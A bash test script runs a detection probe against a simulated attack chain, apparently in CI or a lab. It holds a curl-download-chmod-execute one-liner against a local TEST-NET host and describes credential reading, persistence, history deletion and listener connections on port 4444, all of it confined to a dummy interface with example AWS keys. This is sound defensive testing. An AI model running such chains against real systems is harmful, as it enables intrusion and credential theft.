#!/bin/bash
# Live eBPF check (CI/lab only, needs sudo + bpftrace + iproute2): start the probe, run a
# benign but attack-shaped chain that never leaves the machine, stop the probe.
#
#   download (198.51.100.7:8081, a TEST-NET address on a dummy interface)
#   -> exec from /tmp -> read dummy creds -> write dummy unit + cron-style file
#   -> delete a dummy shell history -> connect to local listeners (198.51.100.7:4444, [::1]:4445)
#
# Everything the chain writes lives under a throwaway HOME (/tmp/rl-home) and /tmp; the
# credentials are AWS's documented example key. Output: $OUT/capture.jsonl, $OUT/probe.pid,
# $OUT/chain.json, $OUT/bpftrace.err.
set -euo pipefail
if [ "${GITHUB_ACTIONS:-}" != "true" ] && [ "${ROOTLINE_LAB:-}" != "1" ]; then
  echo "run_chain.sh: CI/lab only (it adds a network interface and runs bpftrace)." >&2
  echo "Set ROOTLINE_LAB=1 on a disposable machine you own to run it anyway." >&2
  exit 2
fi
HERE="$(cd "$(dirname "$0")" && pwd)"
REPO="$(cd "$HERE/../.." && pwd)"
OUT="${OUT:-$REPO/live-out}"
LAB_IP=198.51.100.7
export HOME=/tmp/rl-home         # short: the probe cuts paths at 64 bytes
DECOY_DIR="$(mktemp -d)"
mkdir -p "$OUT" "$OUT/www" "$HOME/.aws"
cp "$HERE/stage.sh" "$OUT/www/stage.sh"
OUT="$(cd "$OUT" && pwd)"

PIDS=()
cleanup() {
  sudo pkill -INT -x bpftrace 2>/dev/null || true
  for p in "${PIDS[@]}"; do kill "$p" 2>/dev/null || true; done
  sudo ip link del rl0 2>/dev/null || true
  rm -rf "$HOME" "$DECOY_DIR" /tmp/rootline-lab-stage.sh
}
trap cleanup EXIT

# dummy credential file (AWS documentation example values) - created BEFORE tracing starts
printf '[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n' \
  > "$HOME/.aws/credentials"
printf 'ls\n' > "$HOME/.bash_history"

# a non-loopback address that exists only inside this runner (RFC 5737 TEST-NET-2)
sudo ip link add rl0 type dummy
sudo ip addr add "$LAB_IP/32" dev rl0
sudo ip link set rl0 up

python3 -m http.server 8081 --bind "$LAB_IP" --directory "$OUT/www" >"$OUT/http.log" 2>&1 &
PIDS+=($!)
python3 -m http.server 4445 --bind ::1 --directory "$OUT/www" >"$OUT/http6.log" 2>&1 &
PIDS+=($!)
python3 -c "
import socket
s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('$LAB_IP', 4444)); s.listen(1)
c, _ = s.accept(); print(c.recv(100)); c.close()
" >"$OUT/listener.log" 2>&1 &
LST=$!
sleep 1

# exec keeps the PID: the shell's $$ becomes bpftrace's PID, which the probe excludes ($1)
sudo sh -c 'echo $$ > "$1/probe.pid"; exec bpftrace -f json "$2" $$' _ "$OUT" "$REPO/probes/rootline.bt" \
  >"$OUT/capture.jsonl" 2>"$OUT/bpftrace.err" &
BPF=$!
ready=0
for _ in $(seq 1 90); do
  if grep -q '"attached_probes"' "$OUT/capture.jsonl" 2>/dev/null || grep -q '^Attaching' "$OUT/bpftrace.err" 2>/dev/null; then
    ready=1; break
  fi
  if ! kill -0 "$BPF" 2>/dev/null; then break; fi
  sleep 1
done
cat "$OUT/bpftrace.err"
if [ "$ready" != 1 ]; then echo "bpftrace did not attach" >&2; exit 1; fi
sleep 1

# decoy: a process that NAMES itself bpftrace must still be traced (self filter is by PID)
cp /bin/cat "$DECOY_DIR/bpftrace"
"$DECOY_DIR/bpftrace" /etc/hostname > /dev/null

# ---- the chain, started from a worker thread of a Python parent (threads are not processes) ----
python3 - "$LAB_IP" <<'PY'
import subprocess, sys, threading
ip = sys.argv[1]
chain = (f"curl -s -o /tmp/rootline-lab-stage.sh http://{ip}:8081/stage.sh && "
         "chmod +x /tmp/rootline-lab-stage.sh && /tmp/rootline-lab-stage.sh")
t = threading.Thread(target=lambda: subprocess.run(["bash", "-c", chain], check=True))
t.start(); t.join()
PY
echo "{\"lab_ip\": \"$LAB_IP\", \"decoy\": \"$DECOY_DIR/bpftrace\", \"home\": \"$HOME\"}" > "$OUT/chain.json"
sleep 2

sudo pkill -INT -x bpftrace || true
wait "$BPF" || true
wait "$LST" 2>/dev/null || true
echo "capture: $(wc -l < "$OUT/capture.jsonl") lines"
